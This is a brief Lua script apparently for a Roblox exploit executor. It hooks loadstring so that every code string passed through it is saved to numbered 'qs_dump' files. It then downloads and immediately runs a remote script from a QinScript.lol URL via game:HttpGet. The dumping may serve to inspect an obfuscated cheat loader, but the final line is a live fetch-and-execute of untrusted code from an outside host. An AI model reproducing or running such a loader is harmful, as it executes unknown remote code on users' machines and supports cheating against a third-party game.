local old_loadstring = loadstring
local _dump_count = 0
loadstring = function(code)
    _dump_count = _dump_count + 1
    pcall(writefile, "qs_dump_" .. _dump_count .. ".lua", tostring(code))
    return old_loadstring(code)
end
loadstring(game:HttpGet("http://QinScript.lol/333/main.lua?XGnb3"))()